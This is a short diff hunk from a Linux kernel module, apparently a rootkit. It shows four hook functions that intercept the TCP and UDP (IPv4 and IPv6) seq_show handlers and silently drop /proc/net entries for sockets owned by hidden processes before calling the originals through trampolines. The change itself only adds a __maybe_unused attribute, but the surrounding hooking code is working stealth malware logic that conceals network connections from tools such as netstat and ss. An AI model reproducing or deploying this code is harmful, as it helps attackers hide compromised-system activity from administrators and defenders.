@@ -837,25 +837,25 @@ static bool is_socket_owner_hidden(void *v) {
     return is_pid_hidden(pid_nr(owner_pid));
 }
 
-static int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
+static int __maybe_unused hook_tcp4_seq_show(struct seq_file *seq, void *v) {
     if (is_socket_owner_hidden(v))
         return 0; /* 跳过此条目 */
     return ((seq_show_fn)h_tcp4_seq_show.trampoline)(seq, v);
 }
 
-static int hook_tcp6_seq_show(struct seq_file *seq, void *v) {
+static int __maybe_unused hook_tcp6_seq_show(struct seq_file *seq, void *v) {
     if (is_socket_owner_hidden(v))
         return 0;
     return ((seq_show_fn)h_tcp6_seq_show.trampoline)(seq, v);
 }
 
-static int hook_udp4_seq_show(struct seq_file *seq, void *v) {
+static int __maybe_unused hook_udp4_seq_show(struct seq_file *seq, void *v) {
     if (is_socket_owner_hidden(v))
         return 0;
     return ((seq_show_fn)h_udp4_seq_show.trampoline)(seq, v);
 }
 
-static int hook_udp6_seq_show(struct seq_file *seq, void *v) {
+static int __maybe_unused hook_udp6_seq_show(struct seq_file *seq, void *v) {
     if (is_socket_owner_hidden(v))
         return 0;
     return ((seq_show_fn)h_udp6_seq_show.trampoline)(seq, v);
